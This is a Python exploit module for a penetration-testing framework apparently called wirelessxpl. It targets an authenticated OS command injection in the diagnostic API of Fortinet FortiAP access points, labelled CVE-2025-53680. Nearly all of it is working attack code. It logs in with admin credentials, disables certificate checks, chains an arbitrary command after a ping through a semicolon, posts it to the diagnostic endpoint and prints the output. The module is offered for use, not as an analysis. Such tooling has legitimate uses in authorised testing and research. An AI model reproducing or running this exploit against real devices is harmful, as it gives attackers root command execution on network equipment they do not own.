# Author: André Henrique (LinkedIn/X: @mrhenrike)
import ssl
import time
import urllib.error
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """FortiAP / FortiAP-U / FortiAP-W2 OS Command Injection (CVE-2025-53680).

    Fortinet FortiAP access points (FortiAP, FortiAP-U, FortiAP-W2)
    contain an authenticated OS command injection vulnerability in the
    web management interface.  The diagnostic page accepts user input
    that is passed to a system shell command without proper sanitization.
    An authenticated attacker with admin access to the AP management
    interface can inject arbitrary OS commands and gain root shell access
    on the underlying FortiOS-based system.

    CVSS v3.1: 7.2 (High), AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "FortiAP OS Command Injection via Diagnostics (CVE-2025-53680)",
        "description": (
            "Exploits CVE-2025-53680 in FortiAP, FortiAP-U, and FortiAP-W2 "
            "access points.  The diagnostic page in the web management "
            "interface passes user input to a shell command without "
            "sanitization.  An authenticated admin can inject OS commands "
            "to achieve root access on the AP."
        ),
        "authors": (
            "Fortinet PSIRT (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-53680",
            "https://fortiguard.com/psirt/",
        ),
        "disclosure_date": "2025-11-15",
        "platform": "fortios",
        "arch": "all",
        "privileged": True,
        "targets": (
            "FortiAP before 7.4.4",
            "FortiAP-U before 7.0.6",
            "FortiAP-W2 before 7.4.4",
        ),
    }

    target = OptIP("", "Target FortiAP management IP")
    port = OptPort(443, "HTTPS management port")
    timeout = OptFloat(5.0, "HTTP request timeout")
    username = OptString("admin", "Admin username")
    password = OptString("", "Admin password")
    command = OptString("id", "OS command to inject")

    _LOGIN_PATH = "/api/v2/authentication"
    _DIAG_PATH = "/api/v2/monitor/system/run-diagnostic"

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _https_request(
        self, method: str, path: str,
        headers: dict | None = None,
        body: bytes | None = None,
    ) -> tuple[int, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("User-Agent", "WirelessXPL-Forge/2.2")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except (urllib.error.URLError, TimeoutError, OSError):
            return 0, b""

    def _authenticate(self) -> str | None:
        """Authenticate to FortiAP and return CSRF token."""
        import json
        body = json.dumps({
            "username": str(self.username),
            "secretkey": str(self.password),
        }).encode()
        headers = {"Content-Type": "application/json"}
        status, resp = self._https_request("POST", self._LOGIN_PATH, headers, body)
        if status == 200:
            try:
                data = json.loads(resp)
                return data.get("session", "")
            except (json.JSONDecodeError, KeyError):
                pass
        return None

    @mute
    def check(self) -> bool:
        """Check if FortiAP management interface is accessible."""
        status, _ = self._https_request("GET", "/login")
        return status in (200, 301, 302, 401, 403)

    def run(self) -> None:
        if not self.target:
            print_error("target is required (FortiAP management IP)")
            return

        if not self.check():
            print_error(f"Cannot reach FortiAP at {self.target}:{self.port}")
            return

        print_success("FortiAP management interface detected; attempting cmd injection")
        self._exploit()

    def _exploit(self) -> None:
        session = self._authenticate()
        if not session:
            print_error("Authentication failed; check credentials.")
            return

        print_status("Authenticated; session token obtained")

        import json
        injected_cmd = f"ping -c1 127.0.0.1; {self.command}"
        payload = json.dumps({
            "command": "diag",
            "args": injected_cmd,
        }).encode()

        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {session}",
        }

        print_status(f"Injecting via diagnostic endpoint: {self.command}")
        status, body = self._https_request("POST", self._DIAG_PATH, headers, payload)

        if status in (200, 201):
            decoded = body.decode("utf-8", errors="replace")
            print_success(f"Command executed. Response:\n{decoded[:512]}")
        elif status == 403:
            print_error("Access denied; may need higher privileges.")
        elif status == 404:
            print_error("Diagnostic endpoint not found; firmware may differ.")
        else:
            print_info(f"Response: HTTP {status}")
